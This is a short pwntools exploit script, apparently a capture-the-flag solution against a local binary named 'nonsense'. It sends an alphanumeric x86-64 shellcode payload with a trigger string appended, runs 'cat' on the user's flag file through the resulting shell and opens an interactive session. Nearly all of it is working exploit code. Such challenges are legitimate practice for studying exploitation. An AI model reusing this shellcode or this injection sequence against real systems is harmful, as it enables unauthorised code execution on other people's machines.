from pwn import *
import time

ip = "localhost"
port = 10000

r = remote(ip, port)
# r = process("./nonsense")

context.arch = "amd64"

# https://hama.hatenadiary.jp/entry/2017/04/04/190129
payload = "RRYh00AAX1A0hA004X1A4hA00AX1A8QX4tPj0X40PZPjAX4znoNDnRYZnCXA"
nonsense = "wubbalubbadubdub"

name = "haha"
payload += nonsense

r.sendafter("?", name)
r.sendafter("?", payload)
time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
